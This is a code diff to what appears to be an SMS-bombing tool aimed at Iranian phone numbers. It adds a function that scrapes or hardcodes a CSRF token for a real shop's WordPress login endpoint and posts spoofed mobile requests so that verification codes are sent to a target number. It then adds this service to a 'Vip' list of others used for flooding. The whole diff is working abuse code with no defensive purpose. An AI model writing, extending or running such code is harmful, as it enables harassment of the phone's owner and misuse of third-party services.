@@ -56,6 +56,70 @@ def check_internet():
 
 
 
+def missomister(phone):
+    import requests
+    import re
+    
+    digits_phone = phone.replace("+98", "")
+    
+    try:
+        session = requests.Session()
+        home_response = session.get("https://www.missomister.com/", timeout=10)
+        
+        # استخراج CSRF_TOKEN
+        csrf_token = None
+        csrf_patterns = [
+            r'name="csrf" value="([a-f0-9]+)"',
+            r'name="dig_nounce" value="([a-f0-9]+)"'
+        ]
+        
+        for pattern in csrf_patterns:
+            match = re.search(pattern, home_response.text)
+            if match:
+                csrf_token = match.group(1)
+                break
+        
+        if not csrf_token:
+            csrf_token = "7bc87785e8"
+        
+        url = "https://www.missomister.com/wp-admin/admin-ajax.php"
+        
+        payload = {
+            "action": "digits_check_mob",
+            "countrycode": "+98",
+            "mobileNo": digits_phone,
+            "csrf": csrf_token,
+            "login": "2",
+            "username": "",
+            "email": "",
+            "captcha": "",
+            "captcha_ses": "",
+            "json": "1",
+            "whatsapp": "0"
+        }
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": "https://www.missomister.com",
+            "Referer": "https://www.missomister.com/",
+        }
+        
+        response = session.post(url, data=payload, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            if response.text.strip() == "1":
+                print(f'{g}(missomister) {a}Code Sent')
+                return True
+        
+        print(f'{r}[-] (missomister) Failed{a}')
+        return False
+            
+    except Exception:
+        print(f'{r}[-] (missomister) Failed{a}')
+        return False
+
 
 def candom_shop(phone):
     import requests
@@ -193,8 +257,9 @@ def send_service_safe(service, phone):
 def Vip(phone, Time):
     services = [
     banimode,
-    tapsi_food,
-    candom_shop,  # اضافه کردن این خط
+    tapsi_food, 
+    candom_shop,
+    missomister,
 ]
     total_services = len(services)
 
